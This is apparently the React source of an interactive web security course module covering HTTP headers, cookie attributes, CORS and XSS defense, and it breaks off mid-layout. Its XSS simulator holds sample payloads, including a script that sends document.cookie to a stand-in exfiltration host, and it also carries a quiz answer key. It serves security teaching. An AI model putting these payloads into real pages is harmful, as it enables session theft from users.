import React, { useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import {
  ArrowLeft,
  ArrowRight,
  BookOpen,
  CheckCircle2,
  ChevronDown,
  ChevronUp,
  Globe,
  Layers,
  Terminal,
  Shield,
  Activity,
  Play,
  RotateCcw,
  Sliders,
  Copy,
  Check,
  Server,
  Network,
  HelpCircle,
  Award,
  AlertTriangle,
  Sparkles,
  Lock,
  Workflow,
  Zap,
  Boxes,
  Compass,
  FileCode,
  ShieldCheck,
  RefreshCw,
  Cpu,
  Monitor,
  HardDrive,
  Clock,
  Gauge,
  SlidersHorizontal,
  ExternalLink,
  Eye,
  FileText,
  Key,
  Database,
  Search,
  AlertCircle,
  FileSpreadsheet,
  TerminalSquare,
  Binary,
  FolderGit2,
  Filter,
  ShieldAlert,
  Target,
  Crosshair,
  UserCheck,
  UserX,
  FileWarning,
  Flame,
  CheckSquare,
  Square,
  PlusCircle,
  Trash2,
  Download,
  Fingerprint,
  Radio,
  FileCheck2,
  ListFilter,
  CheckCheck,
  TrendingUp,
  Wifi,
  Split,
  Router,
  Ban,
  RadioTower,
  KeyRound,
  FileKey,
  LockKeyhole,
  Users,
  UserCog,
  FileLock2,
  FolderLock,
  Wrench,
  FilePlus,
  ShieldX,
  History,
  FileCheck,
  EyeOff,
  ClipboardList,
  Smartphone,
  QrCode,
  KeySquare,
  Share2,
  UserMinus,
  UserPlus,
  ShieldQuestion,
  FingerprintIcon,
  Unlock,
  KeyRoundIcon,
  BadgeCheck,
  Unplug,
  ZapOff,
  Cookie,
  Code2,
  Bug,
  Braces,
} from "lucide-react";
import LearningRo from "./LearningRo";
import ModuleNav from "./ModuleNav";
import { useSyncedTopic } from "../utils/navigation";

/* -------------------------------------------------------------------------- */
/* PREPSPACES CYBERSECURITY MASTER COURSE: MODULE 13                          */
/* Web Application Architecture, HTTP Sessions, Cookies & Browser Security    */
/* Informed by MDN Web Docs, RFC 6265bis, RFC 9110, OWASP Top 10 & Cheat Sheets*/
/* -------------------------------------------------------------------------- */

export default function CybersecurityWebSecurity() {
  const navigate = useNavigate();

  // Navigation & Workspace State
  const [selectedTopic, setSelectedTopic] = useSyncedTopic(1);
  const [showAiTutor, setShowAiTutor] = useState(false);
  const [activeTab, setActiveTab] = useState("theory"); // 'theory' | 'http-sim' | 'cookie-sim' | 'sop-sim' | 'xss-sim' | 'quiz'
  const [copiedCodeId, setCopiedCodeId] = useState(null);

  const copyCode = (code, id) => {
    navigator.clipboard.writeText(code);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  };

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 1: HTTP REQUEST/RESPONSE WIRE DISSECTOR & HEADER ANALYZER        */
  /* -------------------------------------------------------------------------- */
  const [httpMethod, setHttpMethod] = useState("GET");
  const [httpPath, setHttpPath] = useState("/api/v1/user/report");
  const [httpScenario, setHttpScenario] = useState("secure_api"); // 'secure_api' | 'insecure_api' | 'redirect_open' | 'cors_preflight'
  const [enableCsp, setEnableCsp] = useState(true);
  const [enableHsts, setEnableHsts] = useState(true);
  const [enableNosniff, setEnableNosniff] = useState(true);
  const [enableNoStore, setEnableNoStore] = useState(true);
  const [enableFrameAncestors, setEnableFrameAncestors] = useState(true);

  const httpWireData = useMemo(() => {
    let reqHeaders = [
      `Host: app.prepspaces.com`,
      `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0.0.0`,
      `Accept: application/json, text/plain, */*`,
      `Accept-Language: en-US,en;q=0.9`,
      `Connection: keep-alive`,
    ];

    let respStatus = "200 OK";
    let respBody = `{\n  "reportId": "rep_948271",\n  "candidate": "Samarth",\n  "status": "Grade A+ (Certified)",\n  "systemDesignScore": 96,\n  "cybersecurityScore": 98\n}`;

    if (httpScenario === "secure_api") {
      reqHeaders.push(`Cookie: __Host-SessionID=ps_sess_49fa729bc01a39f; Path=/; Secure`);
      reqHeaders.push(`X-CSRF-Token: 9e32a874f6b101c5`);
      respStatus = "200 OK";
    } else if (httpScenario === "insecure_api") {
      reqHeaders.push(`Cookie: session_id=10293847`);
      respStatus = "200 OK";
    } else if (httpScenario === "redirect_open") {
      respStatus = "302 Found";
      respBody = `Redirecting to https://evil-attacker.example.com/phish/login...`;
    } else if (httpScenario === "cors_preflight") {
      reqHeaders = [
        `Host: api.prepspaces.com`,
        `Origin: https://app.prepspaces.com`,
        `Access-Control-Request-Method: POST`,
        `Access-Control-Request-Headers: authorization,content-type`,
      ];
      respStatus = "204 No Content";
      respBody = ``;
    }

    const respHeaders = [
      `Content-Type: ${httpScenario === "redirect_open" ? "text/html" : "application/json; charset=utf-8"}`,
      `Date: ${new Date().toUTCString()}`,
      `Server: caddy/2.8`,
    ];

    if (httpScenario === "redirect_open") {
      respHeaders.push(`Location: https://evil-attacker.example.com/phish/login`);
    }

    if (enableCsp) {
      respHeaders.push(
        `Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors ${
          enableFrameAncestors ? "'none'" : "*"
        };`
      );
    }
    if (enableHsts) {
      respHeaders.push(`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`);
    }
    if (enableNosniff) {
      respHeaders.push(`X-Content-Type-Options: nosniff`);
    }
    if (enableNoStore) {
      respHeaders.push(`Cache-Control: no-store, no-cache, must-revalidate, private`);
      respHeaders.push(`Pragma: no-cache`);
    } else {
      respHeaders.push(`Cache-Control: public, max-age=86400`);
    }

    // Security evaluation
    const findings = [];
    if (!enableNosniff) {
      findings.push({
        severity: "HIGH",
        title: "Missing X-Content-Type-Options",
        desc: "MIME sniffing is enabled; browser may execute script disguised as an image or text/plain.",
      });
    }
    if (!enableHsts) {
      findings.push({
        severity: "MEDIUM",
        title: "Missing Strict-Transport-Security (HSTS)",
        desc: "Initial HTTP request vulnerable to SSL stripping (Moxie Marlinspike attacks).",
      });
    }
    if (!enableNoStore && httpScenario !== "cors_preflight") {
      findings.push({
        severity: "HIGH",
        title: "Sensitive Report Cached Publicly",
        desc: "Cache-Control allows shared CDN caches to store private interview grades, leaking them across tenants.",
      });
    }
    if (!enableCsp) {
      findings.push({
        severity: "CRITICAL",
        title: "Content-Security-Policy Omitted",
        desc: "No defense-in-depth against Cross-Site Scripting (XSS) or malicious data exfiltration.",
      });
    }
    if (httpScenario === "redirect_open") {
      findings.push({
        severity: "CRITICAL",
        title: "Open Redirect Destination Detected",
        desc: "302 Location points to untrusted external origin, facilitating targeted spear-phishing.",
      });
    }

    return {
      reqHeaders,
      respStatus,
      respHeaders,
      respBody,
      findings,
    };
  }, [httpScenario, enableCsp, enableHsts, enableNosniff, enableNoStore, enableFrameAncestors]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 2: COOKIE SECURITY ATTRIBUTES & SAMESITE CONTEXT SANDBOX         */
  /* -------------------------------------------------------------------------- */
  const [cookieSecure, setCookieSecure] = useState(true);
  const [cookieHttpOnly, setCookieHttpOnly] = useState(true);
  const [cookieSameSite, setCookieSameSite] = useState("Lax"); // 'Strict' | 'Lax' | 'None'
  const [cookiePrefix, setCookiePrefix] = useState("__Host-"); // 'none' | '__Host-' | '__Secure-'
  const [cookieDomain, setCookieDomain] = useState("");
  const [cookiePath, setCookiePath] = useState("/");

  const [testContext, setTestContext] = useState("same_site_nav");
  // 'same_site_nav' | 'top_level_cross_nav' | 'cross_site_post' | 'cross_site_img' | 'js_document_cookie'

  const cookieSimulation = useMemo(() => {
    let cookieSent = false;
    let jsReadable = false;
    let reason = "";
    let riskLevel = "LOW";

    // Prefix validation checks
    const prefixErrors = [];
    if (cookiePrefix === "__Host-") {
      if (!cookieSecure) prefixErrors.push("__Host- requires Secure attribute.");
      if (cookiePath !== "/") prefixErrors.push("__Host- requires Path=/.");
      if (cookieDomain) prefixErrors.push("__Host- forbids Domain attribute (must be host-only).");
    } else if (cookiePrefix === "__Secure-") {
      if (!cookieSecure) prefixErrors.push("__Secure- requires Secure attribute.");
    }

    if (testContext === "same_site_nav") {
      cookieSent = true;
      reason = "Same-site request from https://app.prepspaces.com to /profile. All cookie modes permit transmission.";
    } else if (testContext === "top_level_cross_nav") {
      if (cookieSameSite === "Strict") {
        cookieSent = false;
        reason = "Blocked! SameSite=Strict suppresses cookie sending even on top-level link clicks from foreign sites.";
      } else {
        cookieSent = true;
        reason = `Allowed. SameSite=${cookieSameSite} permits cookie on top-level safe GET navigations (window.location / <a> link).`;
      }
    } else if (testContext === "cross_site_post") {
      if (cookieSameSite === "Strict" || cookieSameSite === "Lax") {
        cookieSent = false;
        reason = `BLOCKED (CSRF Neutralized)! SameSite=${cookieSameSite} blocks cookies on cross-origin POST form submissions!`;
      } else {
        cookieSent = cookieSecure;
        reason = cookieSecure
          ? "TRANSMITTED! SameSite=None sends cookie on cross-site POST. CSRF attack succeeded if anti-CSRF token missing!"
          : "BLOCKED by browser: SameSite=None requires Secure attribute.";
        if (cookieSecure) riskLevel = "CRITICAL_CSRF";
      }
    } else if (testContext === "cross_site_img") {
      if (cookieSameSite === "Strict" || cookieSameSite === "Lax") {
        cookieSent = false;
        reason = `BLOCKED! Subresource requests (<img src>, <script src>, <iframe>) from third parties suppress SameSite=${cookieSameSite} cookies.`;
      } else {
        cookieSent = cookieSecure;
        reason = "TRANSMITTED: Third-party tracker or cross-site image carries the cookie.";
      }
    } else if (testContext === "js_document_cookie") {
      if (cookieHttpOnly) {
        jsReadable = false;
        reason = "BLOCKED: document.cookie returns empty string for this cookie because HttpOnly is active.";
      } else {
        jsReadable = true;
        reason = "EXPOSED: JavaScript can read session identifier via document.cookie! An XSS payload can directly steal it!";
        riskLevel = "CRITICAL_XSS";
      }
    }

    // Build synthesized Set-Cookie header
    let cookieName = `${cookiePrefix === "none" ? "" : cookiePrefix}SessionID`;
    let setCookieParts = [`${cookieName}=ps_sess_9024f92a1882`];
    if (cookiePath) setCookieParts.push(`Path=${cookiePath}`);
    if (cookieDomain) setCookieParts.push(`Domain=${cookieDomain}`);
    if (cookieSecure) setCookieParts.push("Secure");
    if (cookieHttpOnly) setCookieParts.push("HttpOnly");
    setCookieParts.push(`SameSite=${cookieSameSite}`);

    return {
      cookieHeader: `Set-Cookie: ${setCookieParts.join("; ")}`,
      cookieSent,
      jsReadable,
      reason,
      riskLevel,
      prefixErrors,
    };
  }, [cookieSecure, cookieHttpOnly, cookieSameSite, cookiePrefix, cookieDomain, cookiePath, testContext]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 3: SAME-ORIGIN POLICY (SOP) & CORS PREFLIGHT ENGINE               */
  /* -------------------------------------------------------------------------- */
  const [callerOrigin, setCallerOrigin] = useState("https://app.prepspaces.com:443");
  const [targetOrigin, setTargetOrigin] = useState("https://api.prepspaces.com:443");
  const [requestMethod, setRequestMethod] = useState("POST");
  const [requestContentType, setRequestContentType] = useState("application/json");
  const [withCredentials, setWithCredentials] = useState(true);
  const [corsAllowOrigin, setCorsAllowOrigin] = useState("https://app.prepspaces.com");
  const [corsAllowCredentials, setCorsAllowCredentials] = useState(true);
  const [corsAllowHeaders, setCorsAllowHeaders] = useState("Content-Type, Authorization");

  const corsAnalysis = useMemo(() => {
    // Parse Origins
    const parseOrigin = (str) => {
      try {
        const url = new URL(str);
        return {
          protocol: url.protocol,
          host: url.hostname,
          port: url.port || (url.protocol === "https:" ? "443" : "80"),
        };
      } catch {
        return { protocol: "https:", host: "invalid", port: "443" };
      }
    };

    const cOrg = parseOrigin(callerOrigin);
    const tOrg = parseOrigin(targetOrigin);

    const isSameOrigin =
      cOrg.protocol === tOrg.protocol && cOrg.host === tOrg.host && cOrg.port === tOrg.port;

    // Check if Simple Request
    const isSimpleMethod = ["GET", "HEAD", "POST"].includes(requestMethod);
    const isSimpleContentType = [
      "application/x-www-form-urlencoded",
      "multipart/form-data",
      "text/plain",
    ].includes(requestContentType);

    const isSimpleRequest = isSimpleMethod && isSimpleContentType;
    const preflightRequired = !isSameOrigin && !isSimpleRequest;

    let originMatch = false;
    if (corsAllowOrigin === "*") {
      originMatch = true;
    } else if (corsAllowOrigin === callerOrigin) {
      originMatch = true;
    }

    let errorReason = null;
    let browserAllowed = false;

    if (isSameOrigin) {
      browserAllowed = true;
    } else {
      if (preflightRequired) {
        // Evaluate preflight OPTIONS
        if (!originMatch) {
          errorReason = `CORS Error: Origin '${callerOrigin}' is not allowed by Access-Control-Allow-Origin (Returned '${corsAllowOrigin}').`;
        } else if (withCredentials && corsAllowOrigin === "*") {
          errorReason =
            "CORS Wildcard Error: Cannot use Access-Control-Allow-Origin: * when request credentials flag is 'include' (Credentials mode violated!).";
        } else if (withCredentials && !corsAllowCredentials) {
          errorReason =
            "CORS Credentials Error: Credentials requested, but Access-Control-Allow-Credentials is not 'true'.";
        } else {
          browserAllowed = true;
        }
      } else {
        // Simple request evaluation
        if (!originMatch) {
          errorReason = `CORS Error: Missing or mismatching Access-Control-Allow-Origin header. Script cannot read response.`;
        } else if (withCredentials && corsAllowOrigin === "*") {
          errorReason =
            "CORS Wildcard Error: Cannot use wildcard * with credentialed request. Browser blocks response access.";
        } else if (withCredentials && !corsAllowCredentials) {
          errorReason =
            "CORS Credentials Error: The response does not have Access-Control-Allow-Credentials set to true.";
        } else {
          browserAllowed = true;
        }
      }
    }

    return {
      isSameOrigin,
      preflightRequired,
      browserAllowed,
      errorReason,
      cOrg,
      tOrg,
    };
  }, [
    callerOrigin,
    targetOrigin,
    requestMethod,
    requestContentType,
    withCredentials,
    corsAllowOrigin,
    corsAllowCredentials,
    corsAllowHeaders,
  ]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 4: XSS DEFENSE & CONTENT SECURITY POLICY (CSP) EVALUATOR          */
  /* -------------------------------------------------------------------------- */
  const [xssPayloadType, setXssPayloadType] = useState("script_tag");
  // 'script_tag' | 'img_onerror' | 'href_javascript' | 'benign_text'
  const [domSinkMethod, setDomSinkMethod] = useState("innerHTML"); // 'innerHTML' | 'textContent'
  const [cspConfigMode, setCspConfigMode] = useState("none"); // 'none' | 'strict_self' | 'nonce_strict' | 'unsafe_inline'

  const xssSimulation = useMemo(() => {
    let rawPayload = "";
    if (xssPayloadType === "script_tag") {
      rawPayload = `<script>fetch('https://evil-exfil.test/steal?c='+document.cookie)</script>`;
    } else if (xssPayloadType === "img_onerror") {
      rawPayload = `<img src="x" onerror="alert('XSS Exploit: Session Stolen!')" />`;
    } else if (xssPayloadType === "href_javascript") {
      rawPayload = `<a href="javascript:alert(document.domain)">Claim 100% Free Scholarship</a>`;
    } else {
      rawPayload = `Welcome back, Samarth! Your system design interview is scheduled for 10:00 AM.`;
    }

    let renderedDom = "";
    let scriptExecuted = false;
    let blockReason = "";

    if (domSinkMethod === "textContent") {
      renderedDom = rawPayload;
      scriptExecuted = false;
      blockReason =
        "SAFELY NEUTRALIZED: Using textContent treats the input strictly as literal string characters, escaping angle brackets and eliminating script execution paths.";
    } else {
      renderedDom = rawPayload;
      if (xssPayloadType === "benign_text") {
        scriptExecuted = false;
        blockReason = "Benign text rendered without active script payload.";
      } else {
        // Evaluate against CSP
        if (cspConfigMode === "none") {
          scriptExecuted = true;
          blockReason =
            "EXPLOIT SUCCEEDED! No Content Security Policy configured. Browser executed the injected script in victim's session context!";
        } else if (cspConfigMode === "unsafe_inline") {
          scriptExecuted = true;
          blockReason =
            "EXPLOIT SUCCEEDED! CSP includes 'unsafe-inline', completely defeating CSP script origin restrictions.";
        } else if (cspConfigMode === "strict_self") {
          if (xssPayloadType === "script_tag" || xssPayloadType === "img_onerror") {
            scriptExecuted = false;
            blockReason =
              "BLOCKED BY CSP! Refused to execute inline event handler/script because it violates the directive: script-src 'self'.";
          } else {
            scriptExecuted = false;
            blockReason = "BLOCKED BY CSP: javascript: navigation blocked by policy.";
          }
        } else if (cspConfigMode === "nonce_strict") {
          scriptExecuted = false;
          blockReason =
            "BLOCKED BY CSP! Script tag lacks valid cryptographic nonce ('nonce-49e8a10b') required by strict-dynamic policy.";
        }
      }
    }

    return {
      rawPayload,
      renderedDom,
      scriptExecuted,
      blockReason,
    };
  }, [xssPayloadType, domSinkMethod, cspConfigMode]);

  /* -------------------------------------------------------------------------- */
  /* CHECKLIST STATE (13.12.4 Browser Security Review Checklist)                 */
  /* -------------------------------------------------------------------------- */
  const [checklist, setChecklist] = useState({
    c1: false,
    c2: false,
    c3: false,
    c4: false,
    c5: false,
    c6: false,
    c7: false,
    c8: false,
  });

  const toggleCheck = (key) => setChecklist((prev) => ({ ...prev, [key]: !prev[key] }));
  const completedChecks = Object.values(checklist).filter(Boolean).length;

  /* -------------------------------------------------------------------------- */
  /* KNOWLEDGE ASSESSMENT QUIZ (13.14 - 10 Questions)                           */
  /* -------------------------------------------------------------------------- */
  const quizQuestions = [
    {
      id: 1,
      question: "Why is client-side authorization insufficient?",
      options: [
        "JavaScript always runs on the server",
        "Users can bypass the interface and send requests directly",
        "Browsers cannot send HTTP requests",
        "Cookies prevent direct requests",
      ],
      correct: 1,
      explanation:
        "The browser environment is under user control. An attacker or proxy can craft raw HTTP requests bypassing client UI buttons, validation logic, and frontend views. The backend must independently authenticate and authorize every request.",
    },
    {
      id: 2,
      question: "Which cookie attribute prevents JavaScript from reading a cookie through document.cookie?",
      options: ["Secure", "SameSite", "HttpOnly", "Path"],
      correct: 2,
      explanation:
        "The HttpOnly flag directs supporting browsers to hide the cookie from client-side scripts (such as document.cookie), mitigating direct credential theft via XSS.",
    },
    {
      id: 3,
      question: "What is the purpose of a CSRF token?",
      options: [
        "Encrypting all HTTP traffic",
        "Helping the server verify that a state-changing request is legitimate",
        "Replacing backend authorization",
        "Preventing all XSS",
      ],
      correct: 1,
      explanation:
        "Anti-CSRF tokens provide an unpredictable, user-specific, server-validated secret embedded into forms or request headers, ensuring that the state-changing request was intentionally submitted by the legitimate application.",
    },
    {
      id: 4,
      question: "Which combination defines a web origin?",
      options: [
        "Username, password, and role",
        "Path, query string, and fragment",
        "Scheme, host, and port",
        "Cookie name and expiration",
      ],
      correct: 2,
      explanation:
        "An origin is defined strictly by the tuple of Scheme (protocol, e.g., https), Host (domain name or IP), and Port (e.g., 443). Differences in any of the three constitute a cross-origin boundary.",
    },
    {
      id: 5,
      question: "What does CORS primarily control?",
      options: [
        "Database permissions",
        "Whether browsers permit scripts to access cross-origin responses",
        "The strength of session identifiers",
        "The application's password policy",
      ],
      correct: 1,
      explanation:
        "CORS is a browser-enforced data-access mechanism. The server uses CORS headers to tell the browser which origins are allowed to read the HTTP response. It does not prevent non-browser clients (curl, Postman) from sending requests.",
    },
    {
      id: 6,
      question: "Which is a safer way to display untrusted plain text in JavaScript?",
      options: ["innerHTML", "eval", "document.write with the raw input", "textContent"],
      correct: 3,
      explanation:
        "Assigning untrusted data to textContent or innerText ensures the browser parses the payload purely as a text node, neutralizing HTML tags and inline scripts without invoking the HTML parser.",
    },
    {
      id: 7,
      question: "What should happen to a server-managed session after logout?",
      options: [
        "It should remain valid indefinitely",
        "It should be invalidated by the server",
        "Its ID should be placed in the URL",
        "It should be converted into a username",
      ],
      correct: 1,
      explanation:
        "On logout, the backend must immediately revoke and delete the session identifier from the active session store so that any future requests re-using that token are strictly rejected.",
    },
    {
      id: 8,
      question: "What does CSP frame-ancestors help prevent?",
      options: [
        "SQL injection",
        "Password reuse",
        "Unauthorized framing and clickjacking",
        "Expired certificates",
      ],
      correct: 2,
      explanation:
        "The frame-ancestors directive specifies which parent origins are allowed to embed the page in an <iframe>, <frame>, or <object>, mitigating clickjacking attacks by forbidding malicious framing.",
    },
    {
      id: 9,
      question: "Which statement about JWTs is correct?",
      options: [
        "Every JWT is encrypted",
        "Decoding a JWT proves it is authentic",
        "A signed JWT's claims are generally readable unless separately encrypted",
        "JWTs automatically enforce authorization",
      ],
      correct: 2,
      explanation:
        "Standard JSON Web Signatures (JWS) are Base64URL encoded and signed, not encrypted. Anyone can decode and inspect the JSON payload claims. Sensitive data must not be stored in unencrypted JWTs.",
    },
    {
      id: 10,
      question: "What is the main risk of broadly setting a cookie Domain attribute?",
      options: [
        "It disables TLS",
        "It may expose the cookie to more subdomains than necessary",
        "It guarantees CSRF protection",
        "It invalidates the session on every request",
      ],
      correct: 1,
      explanation:
        "Setting Domain=example.com allows the cookie to be sent to all existing and future subdomains (*.example.com). If an attacker compromises an auxiliary or staging subdomain, they can capture that broadly scoped cookie.",
    },
  ];

  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);

  const handleSelectAnswer = (qId, optionIdx) => {
    if (quizSubmitted) return;
    setQuizAnswers((prev) => ({ ...prev, [qId]: optionIdx }));
  };

  const quizScore = useMemo(() => {
    let score = 0;
    quizQuestions.forEach((q) => {
      if (quizAnswers[q.id] === q.correct) score++;
    });
    return score;
  }, [quizAnswers]);

  /* -------------------------------------------------------------------------- */
  /* LAB REPORT GENERATOR STATE (13.13)                                         */
  /* -------------------------------------------------------------------------- */
  const [labProjectName, setLabProjectName] = useState("Prepspaces Web Core");
  const [labEnv, setLabEnv] = useState("Local development");
  const [labFindings, setLabFindings] = useState(
    "1. Session cookie lacked __Host- prefix; vulnerable to subdomain injection.\n2. Missing X-Content-Type-Options: nosniff on static asset uploads.\n3. Cache-Control for private student interview reports permitted public CDN caching."
  );
  const [labRisk, setLabRisk] = useState("High");
  const [labRemediation, setLabRemediation] = useState(
    "1. Updated Set-Cookie to include __Host-SessionID with Path=/ and Secure.\n2. Implemented reverse proxy middleware adding nosniff and HSTS.\n3. Configured Cache-Control: no-store, private on all /api/v1/reports/* endpoints."
  );
  const [reportCopied, setReportCopied] = useState(false);

  const copyLabReport = () => {
    const reportText = `=====================================================
PREPSPACES WEB SECURITY ASSESSMENT LAB REPORT
=====================================================
Project / Application: ${labProjectName}
Test Environment:      ${labEnv}
Assessed Risk Level:   ${labRisk}

OBSERVATIONS & FINDINGS:
${labFindings}

RECOMMENDED REMEDIATION & VERIFICATION:
${labRemediation}

Assessment Checklist Progress: ${completedChecks} / 8 Controls Verified
Date Generated: ${new Date().toISOString()}
=====================================================`;
    navigator.clipboard.writeText(reportText);
    setReportCopied(true);
    setTimeout(() => setReportCopied(false), 2500);
  };

  return (
    <div className="min-h-screen bg-[#faf8f5] text-stone-900 font-sans selection:bg-orange-100 selection:text-orange-900">
      {/* Top Breadcrumb & Metadata Header */}
      <header className="border-b border-stone-200/80 bg-[#0d1424]/90 backdrop-blur sticky top-0 z-30">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <button
              onClick={() => navigate("/learning/cybersecurity")}
              className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-stone-700 hover:text-white transition flex items-center text-xs"
              title="Return to Cybersecurity Curriculum"
            >
              <ArrowLeft className="w-4 h-4 mr-1" />
              Course Index
            </button>
            <div className="h-4 w-px bg-slate-700" />
            <div className="flex items-center space-x-2 text-xs">
              <span className="text-orange-600 font-semibold tracking-wider uppercase">
                Module 13
              </span>
              <span className="text-stone-500">/</span>
              <span className="text-stone-700 truncate max-w-[280px] sm:max-w-md">
                Web Architecture, HTTP Sessions, Cookies & Browser Security
              </span>
            </div>
          </div>

          <div className="flex items-center space-x-3">
          </div>
        </div>
      </header>

      {/* TRACK SUB-NAVIGATION */}
      <ModuleNav currentModuleId="web-security" track="cybersecurity" />

      {/* Hero Banner */}
      <div className="border-b border-stone-200 bg-gradient-to-b from-[#f9f7f2] to-[#f4f0e6] px-4 sm:px-6 lg:px-8 py-8">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
            <div className="space-y-3">
              <div className="inline-flex items-center space-x-2 px-2.5 py-1 rounded-full bg-orange-100 border border-orange-200 text-orange-800 font-bold text-xs font-mono">
                <Globe className="w-3.5 h-3.5" />
                <span>RFC 9110 · RFC 6265bis · OWASP Web Defense</span>
              </div>
              <h1 className="text-2xl sm:text-3xl lg:text-4xl font-extrabold tracking-tight text-white">
                Web Application Architecture, HTTP Sessions, Cookies & Browser Security
              </h1>
              <p className="text-sm sm:text-base text-stone-700 max-w-3xl leading-relaxed">
                Deconstruct the multi-tier web application stack from the browser client to edge
                proxies, reverse gateways, and backend business logic. Master the mechanics of HTTP
                statelessness, stateful session lifecycle, cookie attributes, Same-Origin Policy (SOP),
                CORS preflights, and browser security headers to defend against XSS, CSRF, and
                clickjacking.
              </p>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 self-start md:self-auto min-w-[280px]">
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3">
                <div className="text-xs text-stone-600">Standard</div>
                <div className="text-sm font-bold text-orange-600">OWASP ASVS 4.0</div>
              </div>
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3">
                <div className="text-xs text-stone-600">Core Labs</div>
                <div className="text-sm font-bold text-emerald-400">6 Guided Tasks</div>
              </div>
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 col-span-2 sm:col-span-1">
                <div className="text-xs text-stone-600">Interactive Simulators</div>
                <div className="text-sm font-bold text-amber-400">4 Wire Sandboxes</div>
              </div>
            </div>
          </div>

          {/* Quick Nav Anchor Bar */}
          <div className="mt-8 flex flex-wrap items-center gap-2 border-t border-stone-200 pt-4">
            <button
              onClick={() => setActiveTab("theory")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "theory"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <BookOpen className="w-3.5 h-3.5" />
              <span>Theory & Architecture</span>
            </button>
            <button
              onClick={() => setActiveTab("http-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "http-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <TerminalSquare className="w-3.5 h-3.5" />
              <span>Simulator 1: HTTP Wire Dissector</span>
            </button>
            <button
              onClick={() => setActiveTab("cookie-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "cookie-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Cookie className="w-3.5 h-3.5" />
              <span>Simulator 2: Cookie Attributes Sandbox</span>
            </button>
            <button
              onClick={() => setActiveTab("sop-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "sop-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Globe className="w-3.5 h-3.5" />
              <span>Simulator 3: SOP & CORS Preflight</span>
            </button>
            <button
              onClick={() => setActiveTab("xss-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "xss-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Bug className="w-3.5 h-3.5" />
              <span>Simulator 4: XSS vs CSP Defense</span>
            </button>
            <button
              onClick={() => setActiveTab("quiz")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "quiz"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Award className="w-3.5 h-3.5" />
              <span>Quiz ({quizSubmitted ? `${quizScore}/10` : "10 Qs"})</span>
            </button>
          </div>
        </div>
      </div>

      {/* Main Module Layout */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-1 w-full grid grid-cols-1 lg:grid-cols-4 gap-8">
        {/* Left Column: Topics Sidebar & Checklist */}
        <div className="lg:col-span-1 space-y-6">
          {/* Module Nav Sticky Bar */}
          <div className="bg-stone-50/70 border border-stone-200 rounded-xl p-4 sticky top-20 space-y-4">
            <h3 className="text-xs font-bold text-stone-600 tracking-wider uppercase flex items-center justify-between">
              <span>Course Curriculum</span>
              <span className="text-orange-600 font-mono">13 / 24</span>
            </h3>

            <div className="space-y-1">
              {[
                { id: 1, title: "13.1 Module Overview & Objectives" },
                { id: 2, title: "13.2 Web Application Architecture" },
                { id: 3, title: "13.3 HTTP Request-Response Mechanics" },
                { id: 4, title: "13.4 Stateless HTTP & Session Lifecycle" },
                { id: 5, title: "13.5 Cookie Scope & Security Attributes" },
                { id: 6, title: "13.6 Auth Cookies, Bearer Tokens & JWTs" },
                { id: 7, title: "13.7 Browser Origins, SOP & CORS" },
                { id: 8, title: "13.8 Common Web Attack Vectors" },
                { id: 9, title: "13.9 Browser Security Headers (CSP/HSTS)" },
                { id: 10, title: "13.10 Cache Security & Data Exposure" },
                { id: 11, title: "13.11 Secure Input Handling & Defense" },
                { id: 12, title: "13.12 DevTools Security Inspection" },
                { id: 13, title: "13.13 Hands-on Local Security Lab" },
                { id: 14, title: "13.14 Knowledge Assessment" },
                { id: 15, title: "13.15 Official Learning Resources" },
                { id: 16, title: "13.16 Key Takeaways" },
              ].map((topic) => (
                <button
                  key={topic.id}
                  onClick={() => {
                    setSelectedTopic(topic.id);
                    setActiveTab("theory");
                  }}
                  className={`w-full text-left px-3 py-2 rounded-lg text-xs transition flex items-center justify-between ${
                    selectedTopic === topic.id
